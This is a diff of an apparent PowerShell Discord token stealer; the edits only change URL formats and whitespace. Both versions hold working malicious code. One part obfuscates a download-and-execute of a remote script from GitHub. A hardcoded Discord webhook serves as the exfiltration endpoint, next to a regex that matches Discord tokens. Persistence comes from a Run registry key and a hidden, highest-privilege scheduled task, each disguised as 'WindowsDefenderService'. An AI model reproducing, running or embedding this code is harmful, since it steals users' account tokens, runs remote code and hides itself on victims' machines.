@@ -6,7 +6,7 @@ function Get-Payload {
         "(New-Object",
         "Net.WebClient)",
         "DownloadString",
-        "('https://raw.githubusercontent.com/saksham123107-pixel/son/refs/heads/main/son.ps1')"
+        "('https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')"
     )
     return ($s -join '') + " #" + $r
 }
@@ -49,7 +49,7 @@ try {
 } catch {}
 
 # === CONFIG ===
-$myUrl = "https://raw.githubusercontent.com/saksham123107-pixel/son/refs/heads/main/son.ps1"
+$myUrl = "https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1"
 $hook  = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"
 $api   = "https://discord.com/api/v9/users/@me"
 $rgx   = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
@@ -330,15 +330,15 @@ if ($firstRun) {
 
 # === PERSISTENCE ===
 $psArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex (irm '$myUrl')`""
-$psCmd  = "powershell.exe $psArgs"
+$psCmd = "powershell.exe $psArgs"
 
 if (-not $isSystem) {
     try {
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefenderService" -Value $psCmd -Type String -ErrorAction SilentlyContinue
     } catch {}
     try {
-        $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $psArgs
-        $trigger  = New-ScheduledTaskTrigger -AtLogOn
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $psArgs
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
         Register-ScheduledTask -TaskName "WindowsDefenderService" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force -ErrorAction SilentlyContinue
     } catch {}
